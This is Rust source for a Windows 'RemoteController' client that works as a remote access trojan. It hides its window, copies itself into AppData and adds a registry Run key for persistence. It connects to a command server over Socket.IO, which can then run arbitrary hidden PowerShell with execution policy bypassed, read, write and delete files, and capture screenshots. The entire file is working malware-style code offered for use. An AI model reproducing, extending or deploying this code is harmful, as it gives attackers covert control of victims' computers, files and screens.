#![cfg_attr(windows, windows_subsystem = "windows")]
use anyhow::{anyhow, Context, Result};
use directories::BaseDirs;
use rust_socketio::asynchronous::ClientBuilder;
use rust_socketio::Payload;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::{ChildStderr, ChildStdin, ChildStdout, Command};
use tokio::sync::{mpsc, Mutex};
use tokio::time::{sleep, Duration};
use uuid::Uuid;
use winreg::enums::{HKEY_CURRENT_USER, KEY_ALL_ACCESS};
use winreg::RegKey;
use screenshots::Screen;
// image::ImageOutputFormat is not needed after refactor
use std::io::Cursor;
use base64::{engine::general_purpose, Engine as _};
use sysinfo::System;
#[cfg(windows)] use std::os::windows::process::CommandExt;
#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x08000000;

const APP_FOLDER_NAME: &str = "RemoteController";
const CONFIG_FILE: &str = "config.json";
const UUID_FILE: &str = "client_id.txt";
const DEFAULT_SERVER_URL: &str = "http://127.0.0.1:5000";
const SENTINEL_PREFIX: &str = "__RC_END__:";

fn extract_first_json(payload: Payload) -> Option<serde_json::Value> {
    match payload {
        rust_socketio::Payload::Text(values) => values.get(0).cloned(),
        #[allow(deprecated)]
        rust_socketio::Payload::String(s) => serde_json::from_str::<serde_json::Value>(&s).ok(),
        _ => None,
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ClientConfig {
    server_url: String,
    shell: Option<String>,
}

async fn file_operation(op: &str, path: Option<String>, file_data: Option<String>) -> Result<serde_json::Value> {
    match op {
        "list_dir" => {
            let p = PathBuf::from(path.unwrap_or_else(|| ".".to_string()));
            let mut entries = Vec::new();
            let mut read_dir = tokio::fs::read_dir(&p).await?;
            while let Some(entry) = read_dir.next_entry().await? {
                let file_type = entry.file_type().await?;
                entries.push(json!({
                    "name": entry.file_name().to_string_lossy(),
                    "is_dir": file_type.is_dir(),
                }));
            }
            Ok(json!(entries))
        }
        "read_file" => {
            let p = PathBuf::from(path.ok_or_else(|| anyhow!("path required"))?);
            let data = tokio::fs::read(&p).await?;
            let content = String::from_utf8_lossy(&data).into_owned();
            Ok(json!({"content": content}))
        }
        "write_file" => {
            let p = PathBuf::from(path.ok_or_else(|| anyhow!("path required"))?);
            let content = file_data.unwrap_or_default();
            if let Some(parent) = p.parent() { tokio::fs::create_dir_all(parent).await.ok(); }
            let mut f = tokio::fs::File::create(&p).await?;
            use tokio::io::AsyncWriteExt as _;
            f.write_all(content.as_bytes()).await?;
            Ok(json!({"written": true}))
        }
        "delete_file" => {
            let p = PathBuf::from(path.ok_or_else(|| anyhow!("path required"))?);
            tokio::fs::remove_file(&p).await?;
            Ok(json!({"deleted": true}))
        }
        "delete_dir" => {
            let p = PathBuf::from(path.ok_or_else(|| anyhow!("path required"))?);
            tokio::fs::remove_dir_all(&p).await?;
            Ok(json!({"deleted": true}))
        }
        _ => Err(anyhow!("unsupported operation")),
    }
}

async fn capture_screenshot(display_index: Option<usize>) -> Result<String> {
    // 选择屏幕
    let screens = Screen::all().map_err(|e| anyhow!("list screens failed: {}", e))?;
    if screens.is_empty() { return Err(anyhow!("no screens found")); }
    let screen = match display_index {
        Some(idx) if idx < screens.len() => &screens[idx],
        _ => &screens[0],
    };

    // 捕获为 RGBA 图像缓冲
    let rgba_img = screen.capture().map_err(|e| anyhow!("capture failed: {}", e))?; // RgbaImage
    let mut png_bytes: Vec<u8> = Vec::new();
    let dyn_img = image::DynamicImage::ImageRgba8(rgba_img);
    dyn_img.write_to(&mut Cursor::new(&mut png_bytes), image::ImageOutputFormat::Png)?;
    let b64 = general_purpose::STANDARD.encode(&png_bytes);
    Ok(b64)
}

impl Default for ClientConfig {
    fn default() -> Self {
        Self { server_url: DEFAULT_SERVER_URL.to_string(), shell: Some("powershell".to_string()) }
    }
}

#[derive(Debug, Clone)]
struct CmdResult {
    stdout: String,
    stderr: String,
}

#[derive(Clone)]
struct SharedShell {
    stdin: Arc<Mutex<ChildStdin>>, // synchronized writes
    rx: Arc<Mutex<mpsc::UnboundedReceiver<(bool, String)>>>, // (is_stderr, line)
}

struct ShellManager {
    shared_shell: Option<SharedShell>,
    shared_lock: Arc<Mutex<()>>, // serialize shared exec
    shell_kind: ShellKind,
}

#[derive(Clone, Copy, Debug)]
enum ShellKind {
    PowerShell,
    Cmd,
}

impl ShellManager {
    async fn new(shell_kind: ShellKind) -> Result<Self> {
        Ok(Self { shared_shell: None, shared_lock: Arc::new(Mutex::new(())), shell_kind })
    }

    async fn ensure_shared(&mut self) -> Result<()> {
        if self.shared_shell.is_some() { return Ok(()); }

        match self.shell_kind {
            ShellKind::PowerShell => {
                let mut cmd = Command::new("powershell.exe");
                #[cfg(windows)]
                { cmd.creation_flags(CREATE_NO_WINDOW); }
                let mut child = cmd
                    .args(["-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass"]) // keep process alive
                    .stdin(Stdio::piped())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .spawn()
                    .context("spawn powershell.exe failed")?;

                let stdin = child.stdin.take().ok_or_else(|| anyhow!("no stdin"))?;
                let stdout = child.stdout.take().ok_or_else(|| anyhow!("no stdout"))?;
                let stderr = child.stderr.take().ok_or_else(|| anyhow!("no stderr"))?;
                self.shared_shell = Some(Self::spawn_readers(stdin, stdout, stderr).await?);
            }
            ShellKind::Cmd => {
                let mut cmd = Command::new("cmd.exe");
                #[cfg(windows)]
                { cmd.creation_flags(CREATE_NO_WINDOW); }
                let mut child = cmd
                    .arg("/Q") // no echo
                    .stdin(Stdio::piped())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .spawn()
                    .context("spawn cmd.exe failed")?;

                let stdin = child.stdin.take().ok_or_else(|| anyhow!("no stdin"))?;
                let stdout = child.stdout.take().ok_or_else(|| anyhow!("no stdout"))?;
                let stderr = child.stderr.take().ok_or_else(|| anyhow!("no stderr"))?;
                self.shared_shell = Some(Self::spawn_readers(stdin, stdout, stderr).await?);
            }
        }
        Ok(())
    }

    async fn spawn_readers(stdin: ChildStdin, stdout: ChildStdout, stderr: ChildStderr) -> Result<SharedShell> {
        let (tx, rx) = mpsc::unbounded_channel::<(bool, String)>();

        // stdout reader
        let mut out_reader = BufReader::new(stdout).lines();
        let tx_out = tx.clone();
        tokio::spawn(async move {
            loop {
                match out_reader.next_line().await {
                    Ok(Some(line)) => { let _ = tx_out.send((false, line)); }
                    Ok(None) => { break; }
                    Err(_) => { break; }
                }
            }
        });

        // stderr reader
        let mut err_reader = BufReader::new(stderr).lines();
        let tx_err = tx.clone();
        tokio::spawn(async move {
            loop {
                match err_reader.next_line().await {
                    Ok(Some(line)) => { let _ = tx_err.send((true, line)); }
                    Ok(None) => { break; }
                    Err(_) => { break; }
                }
            }
        });

        Ok(SharedShell { stdin: Arc::new(Mutex::new(stdin)), rx: Arc::new(Mutex::new(rx)) })
    }

    async fn exec_shared(&mut self, command: &str) -> Result<CmdResult> {
        self.ensure_shared().await?;
        let _guard = self.shared_lock.lock().await; // serialize

        let token = Uuid::new_v4().to_string();
        let sentinel = format!("{SENTINEL_PREFIX}{token}");

        // prepare command with sentinel
        let full_cmd = match self.shell_kind {
            ShellKind::PowerShell => format!(
                "{cmd}\nWrite-Output \"{sent}\"\n",
                cmd = command,
                sent = &sentinel
            ),
            ShellKind::Cmd => format!(
                "{cmd} & echo {sent}\n",
                cmd = command,
                sent = &sentinel
            ),
        };

        if let Some(shared) = &self.shared_shell {
            {
                let mut stdin = shared.stdin.lock().await;
                stdin.write_all(full_cmd.as_bytes()).await?;
                stdin.flush().await?;
            }

            let mut stdout_buf = String::new();
            let mut stderr_buf = String::new();

            loop {
                let mut rx = shared.rx.lock().await;
                if let Some((is_err, line)) = rx.recv().await {
                    if line.contains(&sentinel) {
                        break;
                    }
                    if is_err { stderr_buf.push_str(&format!("{line}\n")); } else { stdout_buf.push_str(&format!("{line}\n")); }
                } else {
                    break;
                }
            }

            return Ok(CmdResult { stdout: stdout_buf, stderr: stderr_buf });
        }
        Err(anyhow!("shared shell not available"))
    }

    async fn exec_new(&self, command: &str) -> Result<CmdResult> {
        match self.shell_kind {
            ShellKind::PowerShell => {
                let mut cmd = Command::new("powershell.exe");
                #[cfg(windows)]
                { cmd.creation_flags(CREATE_NO_WINDOW); }
                let output = cmd
                    .args(["-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command])
                    .output()
                    .await?;
                Ok(CmdResult { stdout: String::from_utf8_lossy(&output.stdout).into_owned(), stderr: String::from_utf8_lossy(&output.stderr).into_owned() })
            }
            ShellKind::Cmd => {
                let mut cmd = Command::new("cmd.exe");
                #[cfg(windows)]
                { cmd.creation_flags(CREATE_NO_WINDOW); }
                let output = cmd
                    .args(["/C", command])
                    .output()
                    .await?;
                Ok(CmdResult { stdout: String::from_utf8_lossy(&output.stdout).into_owned(), stderr: String::from_utf8_lossy(&output.stderr).into_owned() })
            }
        }
    }
}
fn appdata_dir() -> Result<PathBuf> {
    let base = BaseDirs::new().ok_or_else(|| anyhow!("failed to get base dirs"))?;
    Ok(base.data_dir().join(APP_FOLDER_NAME))
}

fn is_under_dir(path: &Path, dir: &Path) -> bool {
    let path = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
    let dir = dir.canonicalize().unwrap_or_else(|_| dir.to_path_buf());
    path.starts_with(dir)
}

fn read_or_create_uuid(data_dir: &Path) -> Result<String> {
    fs::create_dir_all(data_dir).ok();
    let id_path = data_dir.join(UUID_FILE);
    if id_path.exists() {
        Ok(fs::read_to_string(id_path)?.trim().to_string())
    } else {
        let new_id = Uuid::new_v4().to_string();
        fs::write(id_path, &new_id)?;
        Ok(new_id)
    }
}

fn read_or_create_config(data_dir: &Path) -> Result<ClientConfig> {
    fs::create_dir_all(data_dir).ok();
    let cfg_path = data_dir.join(CONFIG_FILE);
    if cfg_path.exists() {
        let raw = fs::read_to_string(&cfg_path)?;
        let cfg: ClientConfig = serde_json::from_str(&raw)?;
        Ok(cfg)
    } else {
        let cfg = ClientConfig::default();
        fs::write(&cfg_path, serde_json::to_string_pretty(&cfg)?).ok();
        Ok(cfg)
    }
}

fn ensure_self_in_appdata(data_dir: &Path) -> Result<Option<PathBuf>> {
    let current_exe = env::current_exe()?;
    let target_dir = data_dir;
    fs::create_dir_all(target_dir).ok();
    if !is_under_dir(&current_exe, target_dir) && env::var("LAUNCHED_FROM_MIGRATION").ok().as_deref() != Some("1") {
        let file_name = current_exe.file_name().ok_or_else(|| anyhow!("exe file name missing"))?;
        let target_exe = target_dir.join(file_name);
        // 若目标文件被占用，尝试结束占用同名进程后再拷贝
        let copy_result = fs::copy(&current_exe, &target_exe);
        if copy_result.is_err() {
            // 尝试终止已在目标路径运行的同名进程
            terminate_process_running_exe(&target_exe);
        }
        fs::copy(&current_exe, &target_exe).context("copy self to appdata failed")?;

        let child = std::process::Command::new(&target_exe)
            .env("LAUNCHED_FROM_MIGRATION", "1")
            .spawn()
            .context("spawn migrated executable failed")?;
        let _ = child.id();

        // 写注册表以设置开机自启动（当前用户）
        if let Some(path_str) = target_exe.to_str() {
            if let Err(e) = register_run_at_startup("RemoteControllerClient", path_str) {
                eprintln!("failed to set startup registry: {}", e);
            }
        }
        return Ok(Some(target_exe));
    }
    Ok(None)
}

fn terminate_process_running_exe(target_exe: &Path) {
    // 静默尝试：枚举进程并结束与目标 exe 路径匹配的进程
    let mut sys = System::new();
    sys.refresh_processes();
    let target_str = target_exe.to_string_lossy().to_string().to_lowercase();
    for (_pid, proc_) in sys.processes() {
        if let Some(exe) = proc_.exe() {
            if exe.to_string_lossy().to_string().to_lowercase() == target_str {
                let _ = proc_.kill();
            }
        }
    }
    // 等待片刻让系统释放文件句柄
    std::thread::sleep(std::time::Duration::from_millis(300));
}

fn register_run_at_startup(value_name: &str, exe_path: &str) -> Result<()> {
    // HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (run, _) = hkcu.create_subkey_with_flags(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        KEY_ALL_ACCESS,
    )?;
    // 用引号包裹路径，避免空格问题
    let quoted = format!("\"{}\"", exe_path);
    run.set_value(value_name, &quoted)?;
    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    // 迁移到AppData
    let data_dir = appdata_dir()?;
    if let Some(new_path) = ensure_self_in_appdata(&data_dir)? {
        println!("migrated to appdata: {}", new_path.display());
        return Ok(());
    }

    // 配置与UUID
    let cfg = read_or_create_config(&data_dir)?;
    let client_uuid = read_or_create_uuid(&data_dir)?;
    let server_url = env::var("SERVER_URL").unwrap_or_else(|_| cfg.server_url.clone());

    // 选择shell类型
    let shell_kind = match cfg.shell.as_deref() {
        Some("cmd") => ShellKind::Cmd,
        _ => ShellKind::PowerShell,
    };
    let shell_manager = std::sync::Arc::new(tokio::sync::Mutex::new(ShellManager::new(shell_kind).await?));
    let shell_manager_for_api = shell_manager.clone();

    // 重连循环
    loop {
        println!("connecting to server: {}", &server_url);
        let builder = ClientBuilder::new(&server_url)
            .namespace("/")
            .reconnect_on_disconnect(true)
            .reconnect_delay(5, 30)
            .auth(json!({"uuid": client_uuid}))
            .on("connect", {
                let uid = client_uuid.clone();
                move |_payload: Payload, socket| {
                    let uid = uid.clone();
                    Box::pin(async move {
                        // 冗余兼容：连接成功后再尝试一次事件注册，保证服务器收到
                        let _ = socket.emit("register_client", json!({"uuid": uid})).await;
                    })
                }
            })
            .on("run_command", {
                let uuid = client_uuid.clone();
                let shell = shell_manager.clone();
                move |payload: Payload, socket| {
                    let uuid = uuid.clone();
                    let shell = shell.clone();
                    Box::pin(async move {
                        let v = extract_first_json(payload);
                        if let Some(val) = v {
                            let command = val.get("command").and_then(|x| x.as_str()).unwrap_or("").to_string();
                            let use_shared = val.get("use_shared_context").and_then(|x| x.as_bool()).unwrap_or(true);
                            if command.is_empty() { return; }
            let res = if use_shared {
                // 对于 PowerShell，强制输出结束标记以保证读取完整
                shell.lock().await.exec_shared(&command).await
            } else {
                shell.lock().await.exec_new(&command).await
            };
                            match res {
                                Ok(out) => {
                                    let msg = json!({"uuid": uuid, "command": command, "output": out.stdout, "error": out.stderr});
                                    let _ = socket.emit("command_output", msg).await;
                                }
                                Err(e) => {
                                    let msg = json!({"uuid": uuid, "command": command, "output": "", "error": e.to_string()});
                                    let _ = socket.emit("command_output", msg).await;
                                }
                            }
                        }
                    })
                }
            })
            .on("do_file_operation", {
                let uuid = client_uuid.clone();
                let _shell = shell_manager_for_api.clone();
                move |payload: Payload, socket| {
                    let uuid = uuid.clone();
                    Box::pin(async move {
                        let v = extract_first_json(payload);
                        if let Some(val) = v {
                            let op = val.get("operation").and_then(|x| x.as_str()).unwrap_or("").to_string();
                            let path = val.get("path").and_then(|x| x.as_str()).map(|s| s.to_string());
                            let file_data = val.get("file_data").and_then(|x| x.as_str()).map(|s| s.to_string());
                            let (success, data_json, err) = match file_operation(&op, path, file_data).await {
                                Ok(value) => (true, value, String::new()),
                                Err(e) => (false, serde_json::Value::Null, e.to_string()),
                            };
                            let _ = socket.emit("file_operation_result", json!({
                                "uuid": uuid,
                                "operation": op,
                                "success": success,
                                "data": data_json,
                                "error": err,
                            })).await;
                        }
                    })
                }
            })
            .on("screenshot", {
                let uuid = client_uuid.clone();
                move |payload: Payload, socket| {
                    let uuid = uuid.clone();
                    Box::pin(async move {
                        let v = extract_first_json(payload);
                        let display_index = v.and_then(|val| val.get("display_index").and_then(|x| x.as_u64())).map(|n| n as usize);
                        match capture_screenshot(display_index).await {
                            Ok(png_base64) => {
                                let _ = socket.emit("screenshot_result", json!({
                                    "uuid": uuid,
                                    "success": true,
                                    "image_base64": png_base64,
                                })).await;
                            }
                            Err(e) => {
                                let _ = socket.emit("screenshot_result", json!({
                                    "uuid": uuid,
                                    "success": false,
                                    "error": e.to_string(),
                                })).await;
                            }
                        }
                    })
                }
            })
            .on("restart", {
                // 收到服务端重启请求：重新读取配置（以支持资源重载），然后拉起自身新进程并退出
                let data_dir = appdata_dir()?; // 捕获目录路径
                move |_payload: Payload, _socket| {
                    let data_dir = data_dir.clone();
                    Box::pin(async move {
                        // 重新读取配置与uuid（以确保变更生效）
                        let _ = read_or_create_config(&data_dir);
                        let _ = read_or_create_uuid(&data_dir);
                        // 拉起自身并退出
                        if let Ok(current) = std::env::current_exe() {
                            let _ = std::process::Command::new(current).spawn();
                        }
                        std::process::exit(0);
                    })
                }
            })
            .on("error", |err: Payload, _socket| {
                Box::pin(async move {
                    eprintln!("socket error: {:?}", err);
                })
            });

        match builder.connect().await {
            Ok(_socket) => {
                println!("connected. uuid registered.");
                // 简单阻塞，等待服务器端断开，由 rust_socketio 自动重连
                loop { sleep(Duration::from_secs(60)).await; }
            }
            Err(e) => {
                eprintln!("connect failed: {}", e);
                sleep(Duration::from_secs(5)).await;
            }
        }
    }
}
